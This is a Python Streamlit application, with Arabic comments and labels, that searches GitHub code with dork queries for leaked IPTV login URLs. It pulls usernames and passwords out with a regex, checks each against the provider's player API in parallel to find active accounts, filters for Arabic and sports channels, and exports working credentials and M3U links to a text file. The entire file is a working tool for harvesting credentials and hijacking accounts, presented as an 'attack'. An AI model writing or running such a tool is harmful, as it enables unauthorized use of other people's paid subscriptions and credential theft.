import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures
import time

# =================================================
# 1. إعدادات الواجهة (تصميم احترافي ومنع تداخل الأكواد)
# =================================================
st.set_page_config(page_title="BEAST V24 HUNTER", layout="wide", page_icon="🎯")

st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .main-header { color: #00ff41; text-align: center; font-size: 40px; font-weight: bold; padding: 10px; border-bottom: 2px solid #222; }
    .result-card {
        background: #111; border: 1px solid #333; border-right: 5px solid #00ff41;
        padding: 15px; border-radius: 8px; margin-bottom: 15px;
    }
    .m3u-box { background: #000; padding: 10px; color: #00ff41; font-size: 11px; border-radius: 5px; margin-top: 5px; border: 1px dashed #444; }
    .stDownloadButton>button { background: #ff8800 !important; color: white !important; width: 100%; border-radius: 10px !important; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0

# =================================================
# 2. محرك الفحص والتحقق
# =================================================
def verify_account(host, user, pw, targets):
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=4).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # فحص المحتوى العربي والقنوات المطلوبة
            cat_url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
            cats_text = requests.get(cat_url, timeout=3).text.upper()
            
            is_ar = any(k in cats_text for k in ["ARABIC", "NILESAT", "MYHD", "EGYPT", "BEIN", "SSC"])
            
            # إذا كان هناك قنوات محددة مطلوبة
            if targets:
                target_list = [t.strip().upper() for t in targets.split(',')]
                if not any(t in cats_text for t in target_list): return None

            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "ar": is_ar, "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. القائمة الجانبية (الأوامر والتحميل)
# =================================================
with st.sidebar:
    st.markdown("<h2 style='color:#00ff41;'>🌪️ BEAST V24</h2>", unsafe_allow_html=True)
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    target_ch = st.text_input("قنوات محددة (اختياري):", placeholder="مثال: BEIN, SSC")
    only_ar = st.checkbox("فلتر محتوى عربي فقط", value=True)
    depth = st.slider("عمق البحث (صفحات):", 1, 50, 10)
    
    if st.button("🚀 ابدأ الهجوم"): st.session_state.is_hunting = True
    if st.button("🛑 توقف"): st.session_state.is_hunting = False

    st.metric("🔍 تم فحصه", st.session_state.checked_count)
    st.metric("💎 صيد ثمين", len(st.session_state.results))

    # --- خيار تحميل النتائج ملف TEXT ---
    if st.session_state.results:
        st.divider()
        st.subheader("📥 تصدير النتائج")
        
        # تجهيز البيانات للتكست
        output_txt = "--- BEAST V24 IPTV HUNT RESULTS ---\n\n"
        for i, res in enumerate(st.session_state.results):
            output_txt += f"Result #{i+1}\n"
            output_txt += f"HOST: {res['host']}\n"
            output_txt += f"USER: {res['user']}\n"
            output_txt += f"PASS: {res['pass']}\n"
            output_txt += f"EXP: {res['exp']}\n"
            output_txt += f"M3U: {res['m3u']}\n"
            output_txt += "-"*30 + "\n"
        
        st.download_button(
            label="📁 تحميل ملف النتائج (TXT)",
            data=output_txt,
            file_name=f"IPTV_Beast_Hunt_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
            mime="text/plain"
        )

# =================================================
# 4. الرادار وعرض النتائج
# =================================================
st.markdown("<div class='main-header'>TITAN RADAR V24</div>", unsafe_allow_html=True)
display_area = st.container()

def refresh_ui():
    with display_area:
        data = st.session_state.results
        if only_ar: data = [i for i in data if i['ar']]
        
        for item in data:
            st.markdown(f"""
            <div class="result-card">
                <div style="color:#00ff41; font-weight:bold; font-size:18px;">{item['host']}</div>
                <div style="font-size:14px; margin-top:5px;">
                    👤 <b>User:</b> {item['user']} | 🔑 <b>Pass:</b> {item['pass']} | 📅 <b>Exp:</b> {item['exp']}
                </div>
                <div class="m3u-box">{item['m3u']}</div>
            </div>
            """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    if not token: st.error("أدخل التوكن أولاً!")
    else:
        headers = {'Authorization': f'token {token}'}
        dorks = [
            '"player_api.php" SSC BEIN ARABIC',
            '"get.php?username=" password "ARABIC"',
            'filename:iptv.txt "http"',
            'extension:txt "username" "password" "OSN"'
        ]

        for dork in dorks:
            if not st.session_state.is_hunting: break
            for page in range(1, depth + 1):
                if not st.session_state.is_hunting: break
                try:
                    r = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100", headers=headers).json()
                    if 'items' in r:
                        for item in r['items']:
                            raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                                for f in ex.map(lambda p: verify_account(*p, target_ch), matches):
                                    st.session_state.checked_count += 1
                                    if f:
                                        st.session_state.results.insert(0, f)
                                        refresh_ui()
                    elif 'message' in r: # هنا يتم التعامل مع الـ Limit
                        st.warning("⚠️ GitHub Limit Reached.. Waiting 30s to resume.")
                        time.sleep(30)
                        break
                except: continue
        st.session_state.is_hunting = False
else:
    refresh_ui()
